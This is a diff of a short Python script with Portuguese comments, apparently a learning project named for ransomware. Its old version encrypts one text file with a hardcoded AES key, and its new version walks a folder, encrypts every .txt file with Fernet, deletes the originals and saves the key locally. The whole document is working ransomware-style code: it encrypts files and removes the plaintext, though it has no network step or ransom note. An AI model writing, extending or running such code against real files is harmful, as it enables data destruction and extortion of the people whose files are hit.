@@ -1,24 +1,33 @@
 import os
-import pyaes
+from cryptography.fernet import Fernet
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Gerar uma chave de criptografia
+key = Fernet.generate_key()
+cipher_suite = Fernet(key)
 
-## remover o arquivo
-os.remove(file_name)
+# Pasta onde os arquivos .txt estão localizados
+pasta = "projeto_ransomware"
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+# Função para criptografar arquivos
+def criptografar_arquivos(pasta):
+    for root, dirs, files in os.walk(pasta):
+        for file in files:
+            if file.endswith(".txt"):
+                caminho_completo = os.path.join(root, file)
+                with open(caminho_completo, "rb") as f:
+                    dados = f.read()
+                dados_criptografados = cipher_suite.encrypt(dados)
+                novo_nome = file.replace(".txt", "_private-root-win.txt")
+                novo_caminho = os.path.join(root, novo_nome)
+                with open(novo_caminho, "wb") as f:
+                    f.write(dados_criptografados)
+                os.remove(caminho_completo)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+# Criptografar os arquivos na pasta
+criptografar_arquivos(pasta)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# Salvar a chave em um arquivo para uso posterior na descriptografia
+with open("chave_privada.key", "wb") as key_file:
+    key_file.write(key)
+
+print("Arquivos criptografados com sucesso!")
